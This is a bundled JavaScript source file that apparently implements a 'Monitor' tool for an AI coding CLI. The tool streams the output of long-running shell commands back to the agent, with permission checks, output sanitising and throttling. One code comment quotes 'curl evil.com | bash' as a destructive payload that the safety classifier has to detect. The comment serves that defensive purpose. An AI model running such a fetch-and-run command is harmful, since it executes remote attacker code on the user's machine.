// Force strict mode and setup for ESM
"use strict";
import {
  MAX_CONCURRENT_MONITORS,
  extractCommandRules,
  getMonitorOutputPath,
  getShellContextEnvVars,
  getShellPagerEnv,
  isShellCommandReadOnlyASTInDirectory
} from "./chunk-MRTRBONQ.js";
import "./chunk-GOFAQQZA.js";
import {
  sanitizeChildEnv
} from "./chunk-65I7S4Z3.js";
import "./chunk-HEOH7JZY.js";
import {
  stripAnsi
} from "./chunk-TWPJO254.js";
import "./chunk-CQ35AJ4Z.js";
import "./chunk-4YS7RMCB.js";
import "./chunk-PQQV3OBW.js";
import "./chunk-ANKISCKU.js";
import "./chunk-4SZ2636R.js";
import "./chunk-5EZRLTLQ.js";
import "./chunk-QHWCP53L.js";
import "./chunk-C4FISGDN.js";
import "./chunk-O6GEWCJA.js";
import "./chunk-KS6F6LZQ.js";
import "./chunk-6PVPNMXU.js";
import "./chunk-OB57Y2WH.js";
import "./chunk-IMV5DBIP.js";
import "./chunk-IWMYX5LB.js";
import "./chunk-QJNDUTOL.js";
import {
  buildShellExecWarnings,
  getCommandRoot,
  getShellConfiguration,
  hasUnsafeMonitorBackgroundOperator,
  normalizeMonitorCommand,
  splitCommands
} from "./chunk-QPTE6BKL.js";
import "./chunk-U6H3XTFA.js";
import "./chunk-ACHCT36C.js";
import "./chunk-CHEIIBT3.js";
import "./chunk-GHG4PQY2.js";
import "./chunk-YVYK3JYU.js";
import "./chunk-Q5N5NEVT.js";
import "./chunk-ADN5KESB.js";
import "./chunk-SK3RZOPS.js";
import "./chunk-EVZT24AF.js";
import "./chunk-ELRMZTPF.js";
import "./chunk-B5WYAQ4I.js";
import "./chunk-JX6XHPTX.js";
import "./chunk-6C3D7BKK.js";
import "./chunk-ZAQM5T2X.js";
import "./chunk-MNU36NGH.js";
import "./chunk-B3HGO6BB.js";
import "./chunk-AUFTA63J.js";
import "./chunk-SATGWSS6.js";
import "./chunk-MLXTMF7H.js";
import "./chunk-BQMSZSG6.js";
import "./chunk-WFNEY5G7.js";
import {
  getCurrentAgentId
} from "./chunk-5FHOPPLZ.js";
import "./chunk-S6LOFUVP.js";
import "./chunk-BKVPLSEI.js";
import "./chunk-WNM6BA7E.js";
import "./chunk-S7UQ3V2H.js";
import "./chunk-QE36VXWP.js";
import "./chunk-2A6RZKP2.js";
import "./chunk-WDVSRQIQ.js";
import "./chunk-GXNXX7A2.js";
import "./chunk-IITTKFWM.js";
import "./chunk-Z72PLR74.js";
import "./chunk-NUQ4GK5I.js";
import "./chunk-KP2FHIFR.js";
import "./chunk-TLS6QN2S.js";
import "./chunk-NAVJD2PQ.js";
import "./chunk-KKPIFWTZ.js";
import "./chunk-NFC4WTY2.js";
import "./chunk-YSD6IY6F.js";
import "./chunk-DJ2GSRLV.js";
import "./chunk-MS4SXNJ6.js";
import "./chunk-GVTAFLWB.js";
import "./chunk-KKGSJZWK.js";
import "./chunk-5ETULJLP.js";
import "./chunk-VGC4I5JJ.js";
import "./chunk-RVT5L74D.js";
import "./chunk-HD7O6WLV.js";
import "./chunk-25FMWESU.js";
import "./chunk-CFMZLE3L.js";
import "./chunk-43QUA4MC.js";
import "./chunk-WZAD4ZNJ.js";
import "./chunk-EKBQJ627.js";
import "./chunk-KUON6Z6R.js";
import "./chunk-XZA32HII.js";
import "./chunk-CA63HYHU.js";
import "./chunk-SBP43AO6.js";
import "./chunk-HHJLM3WQ.js";
import "./chunk-B3XJFEEH.js";
import "./chunk-74TONY4F.js";
import "./chunk-ZRQGTRHA.js";
import {
  BaseDeclarativeTool,
  BaseToolInvocation
} from "./chunk-VPGRGNNH.js";
import {
  ToolDisplayNames,
  ToolNames
} from "./chunk-ERIBG3BX.js";
import {
  createDebugLogger,
  isSubpaths
} from "./chunk-ZYDMQCQP.js";
import {
  getErrorMessage
} from "./chunk-S34QJ6IR.js";
import "./chunk-TBWQLLFO.js";
import "./chunk-UKMWZ5NS.js";
import "./chunk-75DOP5OR.js";
import "./chunk-DMTGGOSA.js";
import "./chunk-YQ3U5MUC.js";
import "./chunk-MATEIJZF.js";
import {
  init_esbuild_shims
} from "./chunk-5O2XNYP6.js";
import {
  __name
} from "./chunk-J2S4EL5Y.js";

// packages/core/src/tools/monitor.ts
init_esbuild_shims();
import { spawn } from "node:child_process";
import os from "node:os";
import path from "node:path";
import { randomUUID } from "node:crypto";
var debugLogger = createDebugLogger("MONITOR");
var DEFAULT_MAX_EVENTS = 1e3;
var MAX_MAX_EVENTS = 1e4;
var DEFAULT_IDLE_TIMEOUT_MS = 3e5;
var MAX_IDLE_TIMEOUT_MS = 6e5;
var MAX_DISPLAY_DESCRIPTION_LENGTH = 80;
var PARTIAL_LINE_BUFFER_CAP = 4096;
var THROTTLE_BURST_SIZE = 5;
var THROTTLE_REFILL_INTERVAL_MS = 1e3;
function truncateDisplayDescription(description) {
  return description.length > MAX_DISPLAY_DESCRIPTION_LENGTH ? description.slice(0, MAX_DISPLAY_DESCRIPTION_LENGTH - 1) + "\u2026" : description;
}
__name(truncateDisplayDescription, "truncateDisplayDescription");
var STRUCTURAL_ENVELOPE_TAGS = /* @__PURE__ */ new Set([
  "task-notification",
  "task-id",
  "tool-use-id",
  "kind",
  "status",
  "event-count",
  "summary",
  "result"
]);
var STRUCTURAL_TAG_REGEX = /<(\/?)([a-zA-Z][a-zA-Z0-9-]*)>/g;
function sanitizeMonitorLine(line) {
  let cleaned = "";
  for (let i = 0; i < line.length; i++) {
    const code = line.charCodeAt(i);
    if (code === 9) {
      cleaned += line[i];
      continue;
    }
    if (code < 32) continue;
    if (code >= 128 && code <= 159) continue;
    cleaned += line[i];
  }
  cleaned = cleaned.replace(STRUCTURAL_TAG_REGEX, (match, slash, tagName) => {
    if (!STRUCTURAL_ENVELOPE_TAGS.has(String(tagName).toLowerCase())) {
      return match;
    }
    return slash === "/" ? `</\u200B${tagName}>` : `<\u200B${tagName}>`;
  });
  return cleaned;
}
__name(sanitizeMonitorLine, "sanitizeMonitorLine");
var MonitorToolInvocation = class extends BaseToolInvocation {
  constructor(config, params) {
    super(params);
    this.config = config;
  }
  static {
    __name(this, "MonitorToolInvocation");
  }
  callId;
  setCallId(callId) {
    this.callId = callId;
  }
  getDescription() {
    const desc = this.params.description || normalizeMonitorCommand(this.params.command).spawnCommand;
    return `Monitor: ${truncateDisplayDescription(desc)}`;
  }
  async getDefaultPermission() {
    const normalized = normalizeMonitorCommand(this.params.command);
    const command = normalized.safetyCommand;
    const cwd = this.params.directory || this.config.getTargetDir?.() || process.cwd();
    try {
      const isReadOnly = await isShellCommandReadOnlyASTInDirectory(
        command,
        cwd
      );
      if (isReadOnly) {
        return "allow";
      }
    } catch (e) {
      debugLogger.warn("AST read-only check failed, falling back to ask:", e);
    }
    return "ask";
  }
  async getConfirmationDetails(_abortSignal) {
    const normalized = normalizeMonitorCommand(this.params.command);
    const cwd = this.params.directory || this.config.getTargetDir?.() || process.cwd();
    const subCommands = splitCommands(normalized.safetyCommand);
    const confirmableSubCommands = [];
    for (const sub of subCommands) {
      let isReadOnly = false;
      try {
        isReadOnly = await isShellCommandReadOnlyASTInDirectory(sub, cwd);
      } catch (e) {
        debugLogger.warn(
          "AST read-only check failed for monitor sub-command, falling back to ask:",
          e
        );
      }
      if (isReadOnly) {
        continue;
      }
      confirmableSubCommands.push(sub);
    }
    const effectiveSubCommands = confirmableSubCommands.length > 0 ? confirmableSubCommands : subCommands;
    const rootCommands = [
      ...new Set(
        effectiveSubCommands.map((sub) => getCommandRoot(sub)).filter((sub) => !!sub)
      )
    ];
    let permissionRules = [];
    try {
      const allRules = [];
      for (const sub of effectiveSubCommands) {
        const rules = await extractCommandRules(sub);
        allRules.push(...rules);
      }
      permissionRules = [...new Set(allRules)].map(
        (rule) => `Monitor(${rule})`
      );
    } catch (e) {
      debugLogger.warn("Failed to extract monitor command rules:", e);
      permissionRules = [`Monitor(${normalized.safetyCommand})`];
    }
    const warnings = buildShellExecWarnings(
      normalized.safetyCommand,
      this.params.command
    );
    const confirmationDetails = {
      type: "exec",
      title: "Monitor",
      command: normalized.spawnCommand,
      rootCommand: rootCommands.join(", ") || (getCommandRoot(normalized.safetyCommand) ?? normalized.spawnCommand),
      permissionRules,
      onConfirm: /* @__PURE__ */ __name(async (_outcome, _payload) => {
      }, "onConfirm")
    };
    if (warnings) {
      confirmationDetails.warnings = warnings;
    }
    return confirmationDetails;
  }
  async execute(_signal) {
    if (_signal.aborted) {
      return {
        llmContent: "Monitor was cancelled before it could start.",
        returnDisplay: "Monitor cancelled."
      };
    }
    const normalized = normalizeMonitorCommand(this.params.command);
    const command = normalized.spawnCommand;
    if (normalized.strippedTrailingAmp) {
      debugLogger.warn(
        "Stripped trailing & from monitor command \u2014 monitor lifecycle handles backgrounding"
      );
    }
    const description = sanitizeMonitorLine(this.params.description || command);
    const displayDescription = truncateDisplayDescription(description);
    const maxEvents = Math.min(
      this.params.max_events ?? DEFAULT_MAX_EVENTS,
      MAX_MAX_EVENTS
    );
    const idleTimeoutMs = Math.min(
      this.params.idle_timeout_ms ?? DEFAULT_IDLE_TIMEOUT_MS,
      MAX_IDLE_TIMEOUT_MS
    );
    const monitorId = `mon_${randomUUID().replace(/-/g, "").slice(0, 16)}`;
    const registry = this.config.getMonitorRegistry();
    const ownerAgentId = getCurrentAgentId() ?? void 0;
    const running = registry.getRunning();
    if (running.length >= MAX_CONCURRENT_MONITORS) {
      return {
        llmContent: `Cannot start monitor: maximum concurrent monitors (${MAX_CONCURRENT_MONITORS}) reached. Stop an existing monitor first.`,
        returnDisplay: `Monitor rejected: too many concurrent monitors.`
      };
    }
    const entryAc = new AbortController();
    const registration = {
      monitorId,
      command,
      description,
      status: "running",
      startTime: Date.now(),
      abortController: entryAc,
      toolUseId: this.callId,
      eventCount: 0,
      lastEventTime: 0,
      maxEvents,
      idleTimeoutMs,
      droppedLines: 0,
      // Reserved path for a future per-monitor writer; no file is created
      // today (events stream into the parent's chat record via the
      // notification callback).
      outputFile: getMonitorOutputPath(
        this.config.storage.getProjectDir(),
        this.config.getSessionId(),
        monitorId
      ),
      ...ownerAgentId ? { ownerAgentId } : {}
    };
    const { executable, argsPrefix } = getShellConfiguration();
    let child;
    try {
      child = spawn(executable, [...argsPrefix, command], {
        cwd: this.params.directory || this.config.getTargetDir(),
        stdio: ["ignore", "pipe", "pipe"],
        detached: true,
        env: {
          ...sanitizeChildEnv(process.env),
          QWEN_CODE: "1",
          TERM: "dumb",
          // no color codes for streaming
          ...getShellPagerEnv(this.config.getShellExecutionConfig().pager, {
            includeGitPager: false,
            platform: os.platform()
          }),
          ...getShellContextEnvVars()
        }
      });
    } catch (err) {
      return {
        llmContent: `Monitor failed to start: ${getErrorMessage(err)}`,
        returnDisplay: `Monitor failed: ${getErrorMessage(err)}`
      };
    }
    registration.pid = child.pid;
    let exited = false;
    let earlySpawnError;
    const captureEarlySpawnError = /* @__PURE__ */ __name((err) => {
      earlySpawnError ??= err;
    }, "captureEarlySpawnError");
    child.on("error", captureEarlySpawnError);
    const stdoutBuf = { value: "" };
    const stderrBuf = { value: "" };
    let tokenBucket = THROTTLE_BURST_SIZE;
    let lastRefill = Date.now();
    const throttledEmit = /* @__PURE__ */ __name((line) => {
      const sanitized = sanitizeMonitorLine(line);
      if (sanitized.length === 0 || sanitized.trim().length === 0) return;
      const now = Date.now();
      const elapsed = now - lastRefill;
      if (elapsed < 0) {
        debugLogger.warn(
          `Monitor ${monitorId}: clock moved backwards by ${-elapsed}ms, resetting refill timestamp`
        );
        lastRefill = now;
      } else {
        const newTokens = Math.floor(elapsed / THROTTLE_REFILL_INTERVAL_MS);
        if (newTokens > 0) {
          tokenBucket = Math.min(THROTTLE_BURST_SIZE, tokenBucket + newTokens);
          lastRefill += newTokens * THROTTLE_REFILL_INTERVAL_MS;
        }
      }
      if (tokenBucket > 0) {
        tokenBucket--;
        registry.emitEvent(monitorId, sanitized);
      } else {
        registration.droppedLines++;
      }
    }, "throttledEmit");
    const flushPartialLineBuffers = /* @__PURE__ */ __name(() => {
      for (const buf of [stdoutBuf, stderrBuf]) {
        const trimmed = buf.value.trim();
        if (trimmed.length > 0) {
          throttledEmit(trimmed);
        }
        buf.value = "";
      }
    }, "flushPartialLineBuffers");
    const killChildProcessGroup = /* @__PURE__ */ __name(() => {
      if (exited || !child.pid) return;
      if (process.platform === "win32") {
        const tk = spawn(
          "taskkill",
          ["/pid", child.pid.toString(), "/f", "/t"],
          { stdio: "ignore" }
        );
        tk.on(
          "error",
          (err) => debugLogger.warn(
            `Monitor taskkill failed for pid ${child.pid}: ${getErrorMessage(err)}`
          )
        );
      } else {
        try {
          process.kill(-child.pid, "SIGTERM");
        } catch (err) {
          debugLogger.warn(
            `Monitor ${monitorId} SIGTERM failed (pid=${child.pid}): ${getErrorMessage(err)}`
          );
        }
        setTimeout(() => {
          if (!exited && child.pid) {
            try {
              process.kill(-child.pid, "SIGKILL");
            } catch (err) {
              debugLogger.warn(
                `Monitor ${monitorId} SIGKILL escalation failed (pid=${child.pid}): ${getErrorMessage(err)}`
              );
            }
          }
        }, 200).unref?.();
      }
    }, "killChildProcessGroup");
    const abortHandler = /* @__PURE__ */ __name(() => {
      flushPartialLineBuffers();
      killChildProcessGroup();
    }, "abortHandler");
    entryAc.signal.addEventListener("abort", abortHandler, { once: true });
    if (entryAc.signal.aborted) {
      abortHandler();
    }
    try {
      registry.register(registration);
    } catch (err) {
      abortHandler();
      entryAc.signal.removeEventListener("abort", abortHandler);
      child.stdout?.destroy?.();
      child.stderr?.destroy?.();
      child.removeListener("error", captureEarlySpawnError);
      child.on("error", () => {
      });
      return {
        llmContent: `Monitor failed to start: ${getErrorMessage(err)}`,
        returnDisplay: `Monitor failed: ${getErrorMessage(err)}`
      };
    }
    const processLines = /* @__PURE__ */ __name((buffer, data) => {
      if (registration.status !== "running") return;
      const text = stripAnsi(data.toString("utf-8"));
      buffer.value += text;
      if (!buffer.value.includes("\n") && buffer.value.length > PARTIAL_LINE_BUFFER_CAP) {
        const trimmed = buffer.value.trim();
        if (trimmed.length > 0) {
          throttledEmit(trimmed.slice(0, PARTIAL_LINE_BUFFER_CAP) + "...");
        }
        buffer.value = "";
        return;
      }
      const lines = buffer.value.split("\n");
      buffer.value = lines.pop() ?? "";
      for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed.length === 0) continue;
        const truncated = trimmed.length > PARTIAL_LINE_BUFFER_CAP ? trimmed.slice(0, PARTIAL_LINE_BUFFER_CAP) + "..." : trimmed;
        throttledEmit(truncated);
      }
    }, "processLines");
    child.stdout?.on("data", (data) => processLines(stdoutBuf, data));
    child.stderr?.on("data", (data) => processLines(stderrBuf, data));
    let cleanedUp = false;
    const cleanup = /* @__PURE__ */ __name(() => {
      if (cleanedUp) return;
      cleanedUp = true;
      flushPartialLineBuffers();
      entryAc.signal.removeEventListener("abort", abortHandler);
      if (registration.droppedLines > 0) {
        debugLogger.info(
          `Monitor ${monitorId} dropped ${registration.droppedLines} lines due to throttling`
        );
      }
    }, "cleanup");
    let exitResult = null;
    const settleFromExit = /* @__PURE__ */ __name((code, sig) => {
      if (registration.status !== "running") return;
      if (entryAc.signal.aborted) {
        registry.cancel(monitorId);
      } else if (code !== null && code !== 0) {
        registry.fail(monitorId, `Exit code ${code}`);
      } else if (sig) {
        registry.fail(monitorId, `Killed by signal ${sig}`);
      } else {
        registry.complete(monitorId, code);
      }
    }, "settleFromExit");
    const onExit = /* @__PURE__ */ __name((code, sig) => {
      exited = true;
      exitResult = { code, sig };
    }, "onExit");
    const onClose = /* @__PURE__ */ __name((code, sig) => {
      exited = true;
      cleanup();
      const result = exitResult ?? { code, sig };
      settleFromExit(result.code, result.sig);
    }, "onClose");
    const onError = /* @__PURE__ */ __name((err) => {
      exited = true;
      cleanup();
      if (registration.status === "running") {
        registry.fail(monitorId, getErrorMessage(err));
      }
    }, "onError");
    child.on("exit", onExit);
    child.on("close", onClose);
    child.on("error", onError);
    child.removeListener("error", captureEarlySpawnError);
    if (earlySpawnError) {
      onError(earlySpawnError);
      return {
        llmContent: `Monitor failed to start: ${getErrorMessage(earlySpawnError)}`,
        returnDisplay: `Monitor failed: ${getErrorMessage(earlySpawnError)}`
      };
    }
    return {
      llmContent: `Monitor started.
id: ${monitorId}
command: ${command}
description: ${description}
max_events: ${maxEvents}
idle_timeout: ${idleTimeoutMs}ms
Events will be delivered as notifications. The monitor auto-stops after ${maxEvents} events or ${idleTimeoutMs}ms of silence.
To inspect: /tasks (text) or the interactive Background tasks dialog (focus the footer Background tasks pill, then Enter \u2014 detail view + live updates).`,
      returnDisplay: `Monitor started: ${displayDescription} (${monitorId})`
    };
  }
};
var MonitorTool = class _MonitorTool extends BaseDeclarativeTool {
  constructor(config) {
    super(
      _MonitorTool.Name,
      ToolDisplayNames.MONITOR,
      "Starts a long-running shell command and streams its stdout/stderr as event notifications back to you.\n\nUse this tool for:\n- Watching log files: `tail -f /var/log/app.log`\n- Monitoring build output: `npm run build --watch`\n- Polling for state changes: `while true; do curl -s http://localhost:8080/health; sleep 1; done`\n- Watching file changes: `fswatch -r ./src`\n\nEach output line from the command becomes a notification event delivered to you. The monitor runs in the background \u2014 you can continue working while it streams events.\n\n**Auto-stop:** The monitor automatically stops after max_events (default 1000) events or after idle_timeout_ms (default 5 minutes) of silence. The process is killed when the monitor stops.\n\n**Do NOT use this tool for:**\n- One-shot commands (use run_shell_command instead)\n- Commands you need the full output from (use run_shell_command instead)\n- Commands with no output (use run_shell_command with is_background: true instead)",
      "execute" /* Execute */,
      {
        type: "object",
        properties: {
          command: {
            type: "string",
            description: "Shell command to run and monitor. Each output line (stdout and stderr) becomes an event notification."
          },
          description: {
            type: "string",
            description: 'Brief description of what this monitor watches (e.g., "webpack build output"). Truncated to 80 characters in display.'
          },
          max_events: {
            type: "integer",
            description: "Stop the monitor after this many events. Default 1000. Max 10000."
          },
          idle_timeout_ms: {
            type: "integer",
            description: "Stop the monitor if no output for this many milliseconds. Default 300000 (5 min). Max 600000."
          },
          directory: {
            type: "string",
            description: "(OPTIONAL) The absolute path of the directory to run the command in. If not provided, the project root directory is used. Must be within the workspace."
          }
        },
        required: ["command"],
        additionalProperties: false
      },
      true,
      // isOutputMarkdown
      false,
      // canUpdateOutput
      true,
      // shouldDefer — monitoring is infrequent
      false,
      // alwaysLoad
      "monitor watch tail log stream background"
    );
    this.config = config;
  }
  static {
    __name(this, "MonitorTool");
  }
  static Name = ToolNames.MONITOR;
  validateToolParamValues(params) {
    if (typeof params.command !== "string" || !normalizeMonitorCommand(params.command).analysisCommand) {
      return "Command cannot be empty.";
    }
    if (hasUnsafeMonitorBackgroundOperator(params.command)) {
      return 'Monitor commands must not contain non-final top-level background operators. Remove "&" and let the monitor manage process lifetime.';
    }
    if (params.max_events !== void 0) {
      if (typeof params.max_events !== "number" || !Number.isInteger(params.max_events) || params.max_events <= 0) {
        return "max_events must be a positive integer.";
      }
      if (params.max_events > MAX_MAX_EVENTS) {
        return `max_events cannot exceed ${MAX_MAX_EVENTS}.`;
      }
    }
    if (params.idle_timeout_ms !== void 0) {
      if (typeof params.idle_timeout_ms !== "number" || !Number.isInteger(params.idle_timeout_ms) || params.idle_timeout_ms <= 0) {
        return "idle_timeout_ms must be a positive integer.";
      }
      if (params.idle_timeout_ms > MAX_IDLE_TIMEOUT_MS) {
        return `idle_timeout_ms cannot exceed ${MAX_IDLE_TIMEOUT_MS}ms (10 minutes).`;
      }
    }
    if (params.directory) {
      if (!path.isAbsolute(params.directory)) {
        return "Directory must be an absolute path.";
      }
      const resolvedDirectoryPath = path.resolve(params.directory);
      const userSkillsDirs = this.config.storage.getUserSkillsDirs();
      if (isSubpaths(userSkillsDirs, resolvedDirectoryPath)) {
        return "Explicitly running monitor commands from within the user skills directory is not allowed. Please use absolute paths for command parameter instead.";
      }
      const ws = this.config.getWorkspaceContext();
      if (!ws.isPathWithinWorkspace(params.directory)) {
        return `Directory '${params.directory}' is not within any of the registered workspace directories.`;
      }
    }
    return null;
  }
  createInvocation(params) {
    return new MonitorToolInvocation(this.config, params);
  }
  /**
   * Forward the full command and optional directory — same shape as
   * ShellTool. The classifier MUST see the actual command being run to
   * detect destructive payloads (`curl evil.com | bash`,
   * `while true; do <exfil>`, …); without this override the default
   * projection returns `''` and the classifier sees `monitor({})`.
   */
  toAutoClassifierInput(params) {
    const out = { command: params.command };
    if (params.directory) out["directory"] = params.directory;
    return out;
  }
};
export {
  MonitorTool,
  sanitizeMonitorLine
};
/**
 * @license
 * Copyright 2025 Qwen
 * SPDX-License-Identifier: Apache-2.0
 */
